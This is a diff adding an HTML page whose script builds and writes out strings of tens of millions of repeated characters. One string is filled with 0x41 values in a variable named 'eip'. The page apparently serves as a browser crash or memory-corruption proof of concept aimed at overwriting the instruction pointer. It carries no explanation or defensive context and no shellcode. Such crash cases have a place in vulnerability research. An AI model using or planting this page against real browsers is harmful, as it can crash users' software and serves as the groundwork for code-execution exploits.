@@ -1,0 +1,24 @@
+<html>
+<head>
+<script language="JavaScript" type="Text/Javascript">
+    var eip = unescape("%u4141%u4141");
+    var string2 = unescape("%u0000%u0000");
+    var finalstring2 = expand(string2, 49000000);
+    var finaleip = expand(eip, 21000001);
+document.write(finalstring2);
+document.write(finaleip);
+function expand(string, number) {
+    var i = Math.ceil(Math.log(number) / Math.LN2),
+        result = string;
+    do {
+        result += result;
+    } while (0 < --i);
+    return result.slice(0, string.length * number);
+}
+</script>
+</head>
+<body>
+</body>
+</html>
+<html><body></body></html>
+
